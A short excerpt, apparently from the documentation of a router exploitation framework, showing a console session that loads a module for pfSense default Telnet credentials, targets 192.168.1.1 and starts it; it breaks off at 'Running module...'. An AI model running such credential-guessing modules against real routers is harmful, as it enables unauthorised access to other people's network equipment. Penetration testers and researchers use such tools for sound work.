...
```
rxf > use creds/routers/pfsense/telnet_default_creds
rxf (PFSense Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rxf (PFSense Router Default Telnet Creds) > run
[*] Running module...
